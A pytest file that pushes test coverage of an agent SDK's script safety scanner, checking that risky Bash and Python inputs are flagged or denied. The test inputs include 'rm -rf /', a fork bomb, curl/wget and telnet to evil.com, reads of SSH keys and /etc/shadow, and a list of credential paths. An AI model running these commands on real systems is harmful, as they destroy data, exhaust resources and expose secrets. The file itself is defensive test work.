"""Final final push to 100% — last remaining uncovered lines."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
from trpc_agent_sdk.tools.safety._types import RiskLevel


# ==========================================================================
# _safety_wrapper.py: 255
# ==========================================================================

def test_sync_wrapper_non_str_script_require_false():
    from trpc_agent_sdk.tools.safety import safety_wrapper
    calls = []

    @safety_wrapper(tool_name="w255fix", script_arg_name="code", require_script=False)
    def f(code=None):
        calls.append(code)
        return "ok"

    assert f(code=[]) == "ok"
    assert calls == [[]]


# ==========================================================================
# _scanner.py
# ==========================================================================

def test_oversized_no_blocklist():
    p = SafetyPolicy(max_script_lines=3, max_script_bytes=999999, blocklist_patterns=[])
    s = SafetyScanner(policy=p)
    r = s.scan(SafetyScanInput(
        script_content="line\n" * 5, script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY
    assert r.risk_level.value == "high"


def test_ast_proc_other():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import subprocess; subprocess.call(['ls'])",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" for f in r.findings)


def test_bash_secret_ref_mapping():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="echo $AWS_SECRET_ACCESS_KEY",
        script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-LEAK-001" for f in r.findings)


def test_redact_aws():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content='x = "AKIAIOSFODNN7EXAMPLE"', script_type=ScriptType.UNKNOWN, tool_name="t"))
    assert r.sanitized


def test_redact_slack():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content='t = "xoxb-1234567890-123-abc"', script_type=ScriptType.UNKNOWN, tool_name="t"))
    assert r.sanitized


def test_extract_url_all():
    from trpc_agent_sdk.tools.safety._scanner import _extract_url
    assert _extract_url("curl http://evil.com/path") == "evil.com"
    assert _extract_url("curl https://evil.com:443/path") == "evil.com"
    assert _extract_url("some text domain.example.com is here") is not None
    assert _extract_url("no_url_here") is None
    assert _extract_url("(call)") is None
    assert _extract_url(".dot") is None


def test_is_in_echo_full():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert _is_in_echo_string("echo 'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert _is_in_echo_string("echo\t'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert _is_in_echo_string("printf 'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert _is_in_echo_string("printf\t'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert _is_in_echo_string("/bin/echo 'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert _is_in_echo_string("/usr/bin/echo 'rm -rf /'", r"rm\s+-rf\s+/") is True
    assert not _is_in_echo_string("cat /etc/shadow", "/etc/shadow")
    assert _is_in_echo_string('echo "rm -rf /"', r"rm\s+-rf\s+/") is True
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")


def test_commands_from_line():
    from trpc_agent_sdk.tools.safety._scanner import _extract_commands_from_line
    assert _extract_commands_from_line("a | b") == ["a", "b"]
    assert _extract_commands_from_line("x") == ["x"]


def test_strip_python_comment():
    from trpc_agent_sdk.tools.safety._scanner import _strip_python_comment_line
    assert "safe" in _strip_python_comment_line("safe_code()")
    assert _strip_python_comment_line("#!shebang") is not None
    assert "'" in _strip_python_comment_line("x = 'hello' + 'world'")


# ==========================================================================
# _rules.py
# ==========================================================================

def test_rules_dangerous_all():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="rm -rf / --no-preserve-root", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("FILE-") for f in r.findings)


def test_rules_network_all():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="curl https://evil.com/x && wget https://evil2.com/y",
        script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("NET-") for f in r.findings)


def test_rules_dep_all():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="yum install nginx", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("DEP-") for f in r.findings)


def test_rules_res_abuse():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="sleep 999999", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("RES-") for f in r.findings)


def test_rules_is_in_echo_rules():
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string
    assert _is_in_echo_string("echo 'safe'", "safe") is True
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")
    assert not _is_in_echo_string("echo 'x'; rm -rf /", r"rm\s+-rf\s+/")


def test_rules_extract_url_rules():
    from trpc_agent_sdk.tools.safety._rules import _extract_url
    assert _extract_url("http://a.com/b") == "a.com"
    assert _extract_url("no url") is None


# ==========================================================================
# _bash_scanner.py
# ==========================================================================

def test_bash_scan_empty_lines():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="\n\n\n\n\necho ok", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.ALLOW


def test_bash_scan_comments_only():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="# line1\n# line2\n\n# line3\necho ok",
        script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.ALLOW


def test_bash_shebang_skip2():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="#!/usr/bin/env bash\necho ok", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.ALLOW


def test_bash_net_telnet():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="telnet evil.com 23", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("BASH-NET") for f in r.findings)


def test_bash_install_yarn():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="npm install evil-pkg", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-DEP-001" for f in r.findings)


def test_bash_inline_redir():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="cmd >/etc/hosts", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-FILE-003" for f in r.findings)


def test_bash_redirect_inline_sensitive_path():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="echo x 2>/etc/hosts", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-FILE-003" for f in r.findings)


def test_bash_background():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="ls -la &", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-PROC-004" for f in r.findings)


def test_bash_dd_large():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="dd if=/dev/zero of=/tmp/x bs=1M count=200",
        script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision != Decision.ALLOW


def test_bash_fork_bomb2():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="x(){ x|x& };x", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY


def test_bash_heredoc2():
    from trpc_agent_sdk.tools.safety._bash_scanner import scan_bash
    findings = scan_bash("python3 << EOF\nid\nEOF")
    assert any(f.kind == "heredoc" for f in findings)


def test_bash_sensitive_paths_all():
    from trpc_agent_sdk.tools.safety._bash_scanner import _is_sensitive_path, _parse_size, _to_seconds
    paths = [
        "/etc/shadow", "/etc/passwd", "/etc/sudoers", "/etc/hosts",
        "~/.ssh/config", "~/.gnupg/key", "~/.aws/credentials",
        "~/.gcloud/key", "~/.azure/key", ".env", "cert.pem",
        "id_rsa", "id_ed25519", "id_ecdsa",
        "/proc/self/environ", "/proc/123/mem", "/proc/456/cmdline",
        "/var/run/docker.sock",
    ]
    for p in paths:
        assert _is_sensitive_path(p), f"should be sensitive: {p}"
    assert not _is_sensitive_path("/tmp/safe")
    assert _parse_size("1G") == 1073741824 and _parse_size("1K") == 1024
    assert _parse_size("4KB") == 4000 and _parse_size("1MB") == 1000000
    assert _parse_size("2GB") == 2000000000
    with pytest.raises(ValueError):
        _parse_size("abc")
    assert _to_seconds(5, "m") == 300 and _to_seconds(1, "d") == 86400
    assert _to_seconds(2, "h") == 7200 and _to_seconds(10, "x") == 10


# ==========================================================================
# _python_scanner.py
# ==========================================================================

def test_py_scan_python_entry():
    from trpc_agent_sdk.tools.safety._python_scanner import scan_python, _extract_domain_from_url
    findings = scan_python("import os; os.system('id')", max_lines=500)
    assert len(findings) > 0
    assert _extract_domain_from_url("https://x.com/y") == "x.com"
    assert _extract_domain_from_url(None) is None
    assert _extract_domain_from_url("not_a_url") is None


def test_py_import_from_alias():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="from subprocess import run as r; r(['ls'])",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_call_handlers():
    s = SafetyScanner()
    # dangerous file ops
    r = s.scan(SafetyScanInput(
        script_content="import os; os.remove('/tmp/x')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-002" for f in r.findings)
    # network
    r2 = s.scan(SafetyScanInput(
        script_content="import urllib.request; urllib.request.urlopen('http://evil.com')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id.startswith("AST-NET") for f in r2.findings)


def test_py_dynamic_calls():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="__import__('os').system('id')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY
    r2 = s.scan(SafetyScanInput(
        script_content="import importlib; importlib.import_module('os')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-003" for f in r2.findings)


def test_py_privilege():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import os; os.setuid(0); os.setgid(0)",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" and "privilege" in f.message.lower() for f in r.findings)


def test_py_taint():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import os; k=os.environ.get('KEY'); print(k)",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)
    r2 = s.scan(SafetyScanInput(
        script_content="import os; k=os.getenv('KEY'); print(k)",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r2.findings)
    r3 = s.scan(SafetyScanInput(
        script_content="import os; k=os.environ['KEY']; print(k)",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r3.findings)


def test_py_range_multiple():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="for i in range(0,20000000): pass",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)
    r2 = s.scan(SafetyScanInput(
        script_content="for i in range(0,20000000,2): pass",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r2.findings)


def test_py_with_session_class():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import requests; s=requests.Session()",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert len(r.findings) > 0


def test_py_sleep_concurrency():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import time; time.sleep(120)",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-002" for f in r.findings)
    r2 = s.scan(SafetyScanInput(
        script_content="import threading; threading.Thread(target=print).start()",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" for f in r2.findings)
    r3 = s.scan(SafetyScanInput(
        script_content="import os; os.fork()",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" and f.risk_level.value == "critical" for f in r3.findings)


def test_py_file_ops():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="open('/etc/x','w').write('y')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-005" for f in r.findings)
    r2 = s.scan(SafetyScanInput(
        script_content="import shutil; shutil.rmtree('/tmp/x')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-001" for f in r2.findings)
    r3 = s.scan(SafetyScanInput(
        script_content="open('~/.ssh/id_rsa').read()",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-003" for f in r3.findings)
    r4 = s.scan(SafetyScanInput(
        script_content="open('/tmp/x').read()",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-004" for f in r4.findings)


def test_py_sensitive_import():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import subprocess; subprocess.run(['ls'])",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert len(r.findings) > 0


def test_py_subprocess_dep():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import subprocess; subprocess.run(['pip','install','pkg'])",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_eval_exec():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="eval('1+1')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-003" for f in r.findings)


def test_py_while_true_loop2():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="while True: pass",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)


def test_py_network_whitelisted2():
    p = SafetyPolicy(whitelist_domains=["safe.api"])
    s = SafetyScanner(policy=p)
    r = s.scan(SafetyScanInput(
        script_content="import requests; requests.get('https://safe.api/d')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-NET-002" for f in r.findings)


def test_py_network_non_whitelisted():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(
        script_content="import requests; requests.get('https://evil.com/d')",
        script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-NET-001" for f in r.findings)
